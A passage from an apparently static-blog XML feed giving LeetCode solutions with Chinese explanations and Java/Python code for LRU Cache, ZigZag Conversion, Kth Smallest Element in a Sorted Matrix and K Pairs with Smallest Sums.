<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RandomListNode</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> label;</span><br><span class="line">    RandomListNode next, random;</span><br><span class="line">    RandomListNode(<span class="keyword">int</span> x) &#123; <span class="keyword">this</span>.label = x; &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Hash Table </tag>
            
            <tag> Linked List </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[146. LRU Cache]]></title>
      <url>/wiki/2017/10/10/Leetcode-146-LRU-Cache/</url>
      <content type="html"><![CDATA[<p>Design and implement a data structure for <a href="https://en.wikipedia.org/wiki/Cache_replacement_policies#LRU">Least Recently Used (LRU) cache</a>. It should support the following operations: <code>get</code> and <code>put</code>.</p>
<ul>
<li><code>get(key)</code> - Get the value (will always be positive) of the key if the key exists in the cache, otherwise return -1.</li>
<li><code>put(key, value)</code> - Set or insert the value if the key is not already present. When the cache reached its capacity, it should invalidate the least recently used item before inserting a new item.</li>
</ul>
<p>Follow up:</p>
<ul>
<li>Could you do both operations in $O(1)$ time complexity?</li>
</ul>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">LRUCache cache = new LRUCache( 2 /* capacity */ );</span><br><span class="line"></span><br><span class="line">cache.put(1, 1);</span><br><span class="line">cache.put(2, 2);</span><br><span class="line">cache.get(1);       // returns 1</span><br><span class="line">cache.put(3, 3);    // evicts key 2</span><br><span class="line">cache.get(2);       // returns -1 (not found)</span><br><span class="line">cache.put(4, 4);    // evicts key 1</span><br><span class="line">cache.get(1);       // returns -1 (not found)</span><br><span class="line">cache.get(3);       // returns 3</span><br><span class="line">cache.get(4);       // returns 4</span><br></pre></td></tr></table></figure>
<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><p>涉及最近最不常使用缓存。这道题目挺难的，因为LRUCache的存取的时间复杂度必须为$O(1)$。一种常见的做法是将哈希表和双向链表结合起来。对于<code>put(key, value)</code>操作，将对应键<code>key</code>和包含该键值对的双向链表节点<code>ListNode(key, value)</code>加入到哈希表中，实现了键和链表节点的一一对应。使用双向链表的原因是，双向链表的插入、删除比较简单，由于缓存使用最近最不常使用(LRU)算法，那么可以将访问过的节点，放到链表首部，永远将节点插入链表首部。为了方便插入和删除，在开始时，加入虚拟的头部、尾部。当链表中元素大于规定的容量时，自动删除链表尾部元素。对于<code>get(key)</code>操作，通过哈希表中获取链表节点，得到对应的值，然后将该链表节点移动到链表头部。</p>
<p>也就是链表维护了LRU的顺序，始终将刚访问过的键值对放在前面，将最近不访问的键值对放在后面。而哈希表维护了键和链表节点的对应关系，可以通过键找到节点。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LRUCache</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;Integer, ListNode&gt; cache;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> capacity;</span><br><span class="line">    <span class="keyword">private</span> ListNode head, tail;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LRUCache</span><span class="params">(<span class="keyword">int</span> capacity)</span> </span>&#123;</span><br><span class="line">        cache = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">this</span>.capacity = capacity;</span><br><span class="line"></span><br><span class="line">        head = <span class="keyword">new</span> ListNode();</span><br><span class="line">        tail = <span class="keyword">new</span> ListNode();</span><br><span class="line"></span><br><span class="line">        head.next = tail;</span><br><span class="line">        tail.prev = head;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        ListNode node = cache.get(key);</span><br><span class="line">        <span class="keyword">if</span> (node == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>; <span class="comment">// should raise exception here.</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// move the accessed node to the head;</span></span><br><span class="line">        afterNodeAccess(node);</span><br><span class="line">        <span class="keyword">return</span> node.val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">put</span><span class="params">(<span class="keyword">int</span> key, <span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">        ListNode node = cache.get(key);</span><br><span class="line">        <span class="keyword">if</span> (node == <span class="keyword">null</span>) &#123;</span><br><span class="line">            ListNode newNode = <span class="keyword">new</span> ListNode(key, value);</span><br><span class="line">            cache.put(key, newNode);</span><br><span class="line">            size++;</span><br><span class="line">            insertNode(newNode);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// update the val.</span></span><br><span class="line">            node.val = value;</span><br><span class="line">            afterNodeAccess(node);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Always add the new node right after head;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">insertNode</span><span class="params">(ListNode node)</span> </span>&#123;</span><br><span class="line">        node.prev = head;</span><br><span class="line">        node.next = head.next;</span><br><span class="line"></span><br><span class="line">        head.next.prev = node;</span><br><span class="line">        head.next = node;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (size &gt; capacity) &#123;</span><br><span class="line">            <span class="comment">// pop the tail</span></span><br><span class="line">            ListNode tail = removeNode();</span><br><span class="line">            cache.remove(tail.key);</span><br><span class="line">            size--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Remove an existing node from the linked list.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">removeNode</span><span class="params">(ListNode node)</span> </span>&#123;</span><br><span class="line">        ListNode pre = node.prev;</span><br><span class="line">        ListNode post = node.next;</span><br><span class="line"></span><br><span class="line">        pre.next = post;</span><br><span class="line">        post.prev = pre;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Move certain node in between to the head.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">afterNodeAccess</span><span class="params">(ListNode node)</span> </span>&#123;</span><br><span class="line">        removeNode(node);</span><br><span class="line">        insertNode(node);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// pop the current tail.</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> ListNode <span class="title">removeNode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ListNode res = tail.prev;</span><br><span class="line">        removeNode(res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">ListNode</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> key;</span><br><span class="line">        <span class="keyword">int</span> val;</span><br><span class="line">        ListNode prev;</span><br><span class="line">        ListNode next;</span><br><span class="line"></span><br><span class="line">        ListNode(<span class="keyword">int</span> key, <span class="keyword">int</span> val)&#123;</span><br><span class="line">            <span class="keyword">this</span>.key = key;</span><br><span class="line">            <span class="keyword">this</span>.val = val;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ListNode() &#123;</span><br><span class="line">            <span class="keyword">this</span>(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对于Java来说，有方便的解决方案。<code>LinkedHashMap</code>是<code>HashMap</code>的子类，但内部还有一个双向链表维持键值对的顺序。键值对可以是插入顺序，也可以是访问顺序。如果是访问顺序，其实就是LRU Cache。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LRUCache</span> <span class="keyword">extends</span> <span class="title">LinkedHashMap</span>&lt;<span class="title">Integer</span>, <span class="title">Integer</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> CAPACITY;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LRUCache</span><span class="params">(<span class="keyword">int</span> capacity)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(capacity, <span class="number">0.75f</span>, <span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">this</span>.CAPACITY = capacity;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.getOrDefault(key, -<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">put</span><span class="params">(<span class="keyword">int</span> key, <span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.put(key, value);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">removeEldestEntry</span><span class="params">(Map.Entry eldest)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size() &gt; CAPACITY;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Design </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[6. ZigZag Conversion]]></title>
      <url>/wiki/2017/10/10/Leetcode-6-ZigZag-Conversion/</url>
      <content type="html"><![CDATA[<p>The string <code>PAYPALISHIRING</code> is written in a zigzag pattern on a given number of rows like this: (you may want to display this pattern in a fixed font for better legibility)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">P   A   H   N</span><br><span class="line">A P L S I I G</span><br><span class="line">Y   I   R</span><br></pre></td></tr></table></figure>
<p>And then read line by line: <code>PAHNAPLSIIGYIR</code><br>Write the code that will take a string and make this conversion given a number of rows:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string convert(string text, int nRows);</span><br></pre></td></tr></table></figure>
<p><code>convert(&quot;PAYPALISHIRING&quot;, 3)</code> should return <code>PAHNAPLSIIGYIR</code>.</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15154440995719.jpg" alt=""></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">convert</span><span class="params">(self, s, numRows)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type s: str</span></span><br><span class="line"><span class="string">        :type numRows: int</span></span><br><span class="line"><span class="string">        :rtype: str</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        lens = len(s)</span><br><span class="line">        <span class="keyword">if</span> lens&lt;<span class="number">2</span> <span class="keyword">or</span> numRows == <span class="number">1</span>: <span class="keyword">return</span> s</span><br><span class="line">        step= <span class="number">1</span> <span class="comment"># increase or decrease</span></span><br><span class="line">        row = <span class="number">0</span></span><br><span class="line">        zigzaglist = [<span class="string">''</span>]*numRows</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> s:</span><br><span class="line">            zigzaglist[row] += char</span><br><span class="line">            row += step</span><br><span class="line">            <span class="keyword">if</span> (row == <span class="number">0</span> <span class="keyword">or</span> row == numRows<span class="number">-1</span>):</span><br><span class="line">                step *= <span class="number">-1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join(zigzaglist)</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[378. Kth Smallest Element in a Sorted Matrix]]></title>
      <url>/wiki/2017/10/10/Leetcode-378-Kth-Smallest-Element-in-a-Sorted-Matrix/</url>
      <content type="html"><![CDATA[<p>Given a $n \times n$ matrix where each of the rows and columns are sorted in ascending order, find the $k$th smallest element in the matrix.</p>
<p>Note that it is the kth smallest element in the sorted order, not the kth distinct element.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">matrix = [</span><br><span class="line">   [ 1,  5,  9],</span><br><span class="line">   [10, 11, 13],</span><br><span class="line">   [12, 13, 15]</span><br><span class="line">],</span><br><span class="line">k = 8,</span><br><span class="line"></span><br><span class="line">return 13.</span><br></pre></td></tr></table></figure>
<p>Note: You may assume $k$ is always valid, $1 \le k \le n^2$.</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>使用最小二叉堆，把元素放入堆中，然后依次取出$k$次，第$k$次取出的元素即为第$k$个最小元素。问题是怎么放元素，才能使时间和空间复杂度达到最优。最直接的方法是把所有元素放入最大二叉堆中，最大二叉堆的大小为k，当二叉堆放不下时，取出堆顶元素，当循环结束时，最大二叉堆的堆顶元素恰好是第$k$个最小元素。但这种方法的时间复杂度达到$O(n\log n)$，很明显是不行的：如果把所有元素排序，然后取出第$k$个最小元素，时间复杂度相同。</p>
<p>上面的方法根本没有利用题目的性质：排序的矩阵。也就是说对于矩阵元素$(i, j)$，元素$(i+1, j)$和元素$(i, j+1)$都大于$(i, j)$。利用这样的性质，可以设想，把第一行元素都放入最小二叉堆中，然后每次取出一个元素$(i, j)$，将大于该元素的元素$(i+1, j)$放入到二叉堆中，依次循环$k$次，第$k$次取出的元素即为第$k$个最小元素。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">kthSmallest</span><span class="params">(<span class="keyword">int</span>[][] matrix, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">    PriorityQueue&lt;Tuple&gt; pq = <span class="keyword">new</span> PriorityQueue&lt;&gt;();</span><br><span class="line">    <span class="keyword">int</span> n = matrix.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        pq.offer(<span class="keyword">new</span> Tuple(matrix[<span class="number">0</span>][i], <span class="number">0</span>, i));</span><br><span class="line">    Tuple cur;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; k; i++) &#123;</span><br><span class="line">        cur = pq.poll();</span><br><span class="line">        <span class="keyword">if</span> (cur.x + <span class="number">1</span> &lt; n) pq.offer(<span class="keyword">new</span> Tuple(matrix[cur.x + <span class="number">1</span>][cur.y], cur.x + <span class="number">1</span>, cur.y));     </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pq.poll().val;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tuple</span> <span class="keyword">implements</span> <span class="title">Comparable</span>&lt;<span class="title">Tuple</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="keyword">int</span> y;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Tuple</span><span class="params">(<span class="keyword">int</span> val, <span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.x = x;</span><br><span class="line">        <span class="keyword">this</span>.y = y;</span><br><span class="line">        <span class="keyword">this</span>.val = val;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(Tuple another)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> val - another.val;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Binary Search </tag>
            
            <tag> Heap </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[373. Find K Pairs with Smallest Sums]]></title>
      <url>/wiki/2017/10/10/Leetcode-373-Find-K-Pairs-with-Smallest-Sums/</url>
      <content type="html"><![CDATA[<p>You are given two integer arrays <em>nums1</em> and <em>nums2</em> sorted in ascending order and an integer <em>k</em>.</p>
<p>Define a pair $(u,v)$ which consists of one element from the first array and one element from the second array.</p>
<p>Find the $k$ pairs $(u_1,v_1),(u_2,v_2) …(u_k,v_k)$ with the smallest sums.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: nums1 = [1,7,11], nums2 = [2,4,6], k = 3</span><br><span class="line">Output: [[1,2],[1,4],[1,6]] </span><br><span class="line">Explanation: The first 3 pairs are returned from the sequence: </span><br><span class="line">             [1,2],[1,4],[1,6],[7,2],[7,4],[11,2],[7,6],[11,4],[11,6]</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: nums1 = [1,1,2], nums2 = [1,2,3], k = 2</span><br><span class="line">Output: [1,1],[1,1]</span><br><span class="line">Explanation: The first 2 pairs are returned from the sequence: </span><br><span class="line">             [1,1],[1,1],[1,2],[2,1],[1,2],[2,2],[1,3],[1,3],[2,3]</span><br></pre></td></tr></table></figure>
<p>Example 3:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: nums1 = [1,2], nums2 = [3], k = 3</span><br><span class="line">Output: [1,3],[2,3]</span><br><span class="line">Explanation: All possible pairs are returned from the sequence: [1,3],[2,3]</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>寻找和最小的k对数字。最直接的方法是给出所有的对，一共有$n_1 \times n_2$对数字，其中$n_1$和$n_2$分别为数组nums1和nums2的长度。然后将所有对排序，取出前$k$对数字。那么怎么排序呢？肯定是必须构造一个Comparator。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;<span class="keyword">int</span>[]&gt; kSmallestPairs(<span class="keyword">int</span>[] nums1, <span class="keyword">int</span>[] nums2, <span class="keyword">int</span> k) &#123;</span><br><span class="line">    List&lt;<span class="keyword">int</span>[]&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span> (nums1 == <span class="keyword">null</span> || nums2 == <span class="keyword">null</span>) <span class="keyword">return</span> list;</span><br><span class="line">    <span class="keyword">int</span> n1 = nums1.length, n2 = nums2.length;</span><br><span class="line">    PriorityQueue&lt;<span class="keyword">int</span>[]&gt; pq = <span class="keyword">new</span> PriorityQueue&lt;&gt;(<span class="keyword">new</span> PairComparator());</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n1; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n2; j++)</span><br><span class="line">            pq.offer(<span class="keyword">new</span> <span class="keyword">int</span>[]&#123;nums1[i], nums2[j]&#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> bound = Math.min(k, n1*n2);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; bound; i++)</span><br><span class="line">        list.add(pq.poll());</span><br><span class="line">    <span class="keyword">return</span> list;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">class PairComparator implements Comparator&lt;int[]&gt; &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(<span class="keyword">int</span>[] one, <span class="keyword">int</span>[] two)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> one[<span class="number">0</span>]  + one[<span class="number">1</span>] - two[<span class="number">0</span>] - two[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一种更好的方法是使用二叉堆来保存最小对，但是只需要维护K个对即可。因为对于每一个在nums1中的元素来说，对于最小的对，总是从nums2中的第一个元素开始，因为nums2是排序的。所以下一个元素总是nums1[this specific number] + nums2[current_associated_index + 1]，除非越界。</p>
<p><img src="http://phpk72ttq.bkt.clouddn.com/15414804648623.png?imageslim" alt=""></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;<span class="keyword">int</span>[]&gt; kSmallestPairs(<span class="keyword">int</span>[] nums1, <span class="keyword">int</span>[] nums2, <span class="keyword">int</span> k) &#123;</span><br><span class="line">    PriorityQueue&lt;<span class="keyword">int</span>[]&gt; pq = <span class="keyword">new</span> PriorityQueue&lt;&gt;((a,b) -&gt; a[<span class="number">0</span>]+a[<span class="number">1</span>]-b[<span class="number">0</span>]-b[<span class="number">1</span>]);</span><br><span class="line">    List&lt;<span class="keyword">int</span>[]&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span> (nums1 == <span class="keyword">null</span> || nums2 == <span class="keyword">null</span>) <span class="keyword">return</span> list;</span><br><span class="line">    <span class="keyword">int</span> n1 = nums1.length, n2 = nums2.length;</span><br><span class="line">    <span class="keyword">if</span> (n1 == <span class="number">0</span> || n2 == <span class="number">0</span> || k == <span class="number">0</span>) <span class="keyword">return</span> list;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n1 &amp;&amp; i &lt; k; i++) </span><br><span class="line">        <span class="comment">// nums1中的值，nums2中的值， nums2的下标</span></span><br><span class="line">        pq.offer(<span class="keyword">new</span> <span class="keyword">int</span>[]&#123;nums1[i], nums2[<span class="number">0</span>], <span class="number">0</span>&#125;);</span><br><span class="line">    <span class="keyword">int</span>[] cur;</span><br><span class="line">    <span class="keyword">int</span> bound = Math.min(n1*n2, k);</span><br><span class="line">    <span class="keyword">while</span> (k--&gt; <span class="number">0</span> &amp;&amp; !pq.isEmpty())&#123;</span><br><span class="line">        cur = pq.poll();</span><br><span class="line">        list.add(<span class="keyword">new</span> <span class="keyword">int</span>[]&#123;cur[<span class="number">0</span>], cur[<span class="number">1</span>]&#125;);</span><br><span class="line">        <span class="keyword">if</span> (cur[<span class="number">2</span>] + <span class="number">1</span> == n2) <span class="keyword">continue</span>;</span><br><span class="line">        pq.offer(<span class="keyword">new</span> <span class="keyword">int</span>[]&#123;cur[<span class="number">0</span>], nums2[cur[<span 